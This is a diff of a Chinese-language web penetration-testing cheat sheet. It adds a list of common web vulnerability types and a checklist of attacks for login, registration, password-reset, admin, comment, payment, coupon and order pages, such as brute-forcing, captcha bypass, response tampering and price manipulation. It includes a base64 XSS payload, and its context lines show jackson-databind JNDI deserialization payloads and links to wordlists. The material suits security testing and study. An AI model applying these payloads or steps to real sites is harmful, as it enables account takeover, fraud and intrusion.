@@ -1,6 +1,10 @@
 # 渗透相关语法
 
 相关漏洞学习资料，利用方法和技巧合集 
+web常见漏洞：
+注入漏洞(HTML注入/代码注入/header头注入(CRLF)/sql注入/xml注入(xxe/wsdl))
+跨站XSS漏洞、安全配置错误、登录认证缺陷、越权、敏感信息泄露、权限控制不严格、请求伪造 (CSRF)、使用了存在漏洞的组件、点击劫持、SSRF
+
 
 
 目录
@@ -55,7 +59,9 @@
 			* [php反序列化](#php反序列化)
 			* [fastjson反序列化](#fastjson反序列化)
 			* [jackson_databind反序列化](#jackson_databind反序列化)
-				
+	* [渗透流程思路](#渗透流程思路)
+		* [登陆框](#登陆框)
+	
 ## 信息收集
 
 > **前端js代码进行审计发现的一些路径记得去测试访问**
@@ -192,6 +198,7 @@ https://www.somd5.com/download/dict/
 		
 ## 注入基础
 > **mssql、mysql、oracle 相关注入基础语句** 
+
 ### mssql注入
 
 #### mssql布尔注入
@@ -813,4 +820,95 @@ __invoke()
 param=["ch.qos.logback.core.db.JNDIConnectionSource", {"jndiLocation": "rmi://jackson_databind_12834.localhost/jackson_databind_12834"}]
 
 {"param": ["org.springframework.context.support.FileSystemXmlApplicationContext","http://jackson_databind_7525.localhost/jackson_databind_7525"]}
+
+
 ```
+
+## 渗透流程思路
+
+### 登陆框
+
+> **暴力破解用户名密码，验证码爆破和绕过，手机号撞库，测试sql注入，未授权访问，返回包绕过**
+<code>
+暴力破解用户名密码：固定用户名如：admin进行爆破密码，固定默认密码如：123456进行爆破用户名
+验证码爆破和绕过：验证码是4位，验证码参数删除，验证码前端验证无效
+手机号撞库：可搜集高质量的手机号
+测试sql注入：用户名框、密码框
+未授权访问：修改成登录主页面如：/index
+返回包绕过：false修改true，fail修改success，0修改1，301修改200
+</code>
+
+- [hacden/常用字典](https://github.com/hacden/Hack/tree/master/%E5%B8%B8%E7%94%A8%E5%AD%97%E5%85%B8)
+- [klionsec/SuperWordlist](https://github.com/klionsec/SuperWordlist)
+- [rootphantomer/Blasting_dictionary](https://github.com/rootphantomer/Blasting_dictionary)
+- [TheKingOfDuck/fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)
+
+### 注册框
+
+> **恶意注册，xss**
+<code>
+恶意用户批量注册：无验证码
+验证码爆破和绕过：验证码是4位，验证码参数删除，验证码前端验证无效
+存储型XSS：注册框，使用xss
+</code>
+
+### 密码找回
+
+> **重置密码**
+<code>
+重置任意用户账户密码：爆破4位验证码，验证码在返回包中，第二步骤或第三步骤修改成自己接受的手机号或邮箱
+批量重置用户密码：默认验证码如：111111
+</code>
+
+### 后台管理
+
+> **越权访问，csrf，xss，文件上传，sql注入，xxe等**
+<code>
+越权访问：注意cookie、url，post中等存在的身份验证参数如：userid (个人资料信息泄漏、个人资料遍历)
+csrf：使用的token是否有效，是否有规律如：删除token
+xss：见框就插或上传后缀，如payload: "><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+文件上传：图片上传处、视频上传处抓包绕过，ueditor编辑器漏洞
+sql注入：关键post参数，url隐藏参数，可结合爆破参数
+xxe：外部实体引用，是否支持xml格式请求
+</code>
+
+### 评论区
+
+> **csrf，xss，遍历用户名**
+<code>
+csrf：使用的token是否有效，是否有规律如：删除token
+xss：见框就插或上传后缀，如payload: "><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+遍历用户名：可结合身份验证参数进行遍历
+</code>
+
+### 购买支付
+
+> **篡改，信息泄漏，虚假充值金额，篡改充值账户**
+<code>
+支付漏洞：修改价格，修改数量，数值溢出，交易信息泄漏
+</code>
+
+### 抽奖_活动
+
+> **盗刷积分**
+<code>
+刷取活动奖品/盗刷积分/抽奖作弊
+</code>
+
+### 代金卷_优惠卷
+
+> **批量刷取代金卷/优惠卷、更改代金卷金额、更改优惠卷数量**
+<code>
+条件竞争/修改金额/修改数量
+</code>
+
+### 订单
+
+> **订单信息泄漏，用户信息泄漏，订单遍历**
+<code>
+订单信息泄漏：越权查看别人订单信息
+订单遍历：订单号有规律
+</code>
+
+
+
